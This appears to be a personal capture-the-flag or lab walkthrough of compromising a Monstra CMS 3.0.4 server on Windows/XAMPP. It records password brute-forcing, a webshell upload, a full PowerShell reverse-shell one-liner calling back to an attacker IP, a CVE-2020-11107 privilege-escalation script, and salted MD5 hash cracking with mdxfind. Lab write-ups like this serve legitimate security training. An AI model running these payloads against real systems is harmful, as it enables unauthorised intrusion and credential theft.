webpage 80 and 443 are the same
homepage looks like moke's portfolio, with no liks, cms's
go buster shows a /blog endpint
upon visiting, we see monstra cms 3.0.4

There's a bunch of searchploit exploits, but all are authenticated
We proceed to try to create a user, but the stupid captcha just wasnt working

So, we proceed to make a wordlist with cewl from the homepage, and bruteforce first against mike, then admin (as those were the users in /users endpoint)

Tried hydra both ways, but the stupid thing was just giving false positives
So HINT TAKEN - wazowski was the password. Shouldv'e known
Anyways, we start with the POC

Once logged in, administration --> content-> file -> upload a file with caps .PHP
But that wasnt working. neither was .htaccess
So, we went to one of the other exploits, which was a python script
After patching it here and there, it generated a webshell

There, we pasted nishang's 1-liner
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.185',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
and we're mike!

---
running winpeas, it looks like everything in c:\xampp is writable to us
Also, winpeas showed c:\xampp\apache\bin\httpd.exe was running on a couple of ports
And we have shutdown privileges

So, start with msfvenom, write it there, restart and hope we get reverse shell
we get a shell, but it is mike. he was the one running it at startup, great
we check for xampp version in c:\xampp\properties.ini = 7.3.10

so we searchsploit for xampp escalation for 7.4.3, close enough!
windows/local/50337.ps1 CVE-2020-11107
and follow along
```powershell
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\programdata\rshell.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```
admin!

---
---
---
We were able to upload a php webshell
But the intended path was -
once we login as admin, we can create a backup
click on that, and click on backedup file to download it

```zsh
grep -Rl "password" C:
xmllint --format storage/database/users.table.xml
#looks like md5, but with salt
#walkthough says the salt would be default YOUR_SALT_HERE
```
We can use the tool `mdxfind` to help us determine how these password hashes were created. We can download a binary from [here](https://www.techsolvency.com/pub/bin/mdxfind/).

```zsh
wget https://www.techsolvency.com/pub/bin/mdxfind/mdxfind.static -O mdxfind
chmod +x mdxfind 
```

Before we can run `mdxfind`, we will need to figure out the salt value used by Monstra CMS and we will need a hash that we know what the original password was. After some web searching, we find [this blog](https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/) which claims that the salt can very likely be the default value of "YOUR_SALT_HERE". Let's write this to a file for use later.

```zsh
echo "YOUR_SALT_HERE" > salt.txt
echo "wazkowski" > pass.txt 
```

As for the known hash, we can simply use the hash of the admin user because we know the password is "wazkowski". Let's create a password file with only that password for `mdxfind` to use.
We now need to pass the admin password hash into `mdxfind` using stdin and specify MD5 hashing, our salt and pass files, and we can attempt to try 5 iterations.

```zsh
echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5
```
The command completes quickly and we now know that these hashes are created with 2 rounds of MD5 with our assumed salt value of "YOUR_SALT_HERE". With this information, we can now use `mdxfind` again to attempt to crack the password hash for the "mike" user. Let's run the same command but swap in mike's hash, specify the hash type, supply the rockyou wordlist, and switch it to 2 iterations.

```zsh
echo "844ffc2c7150b93c4133a6ff2e1a2dba" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/sharewordlists/rockyou.txt -i 2

xfreerdp /cert-ignore /u:mike /p:Mike14 /v:192.168.120.156 
```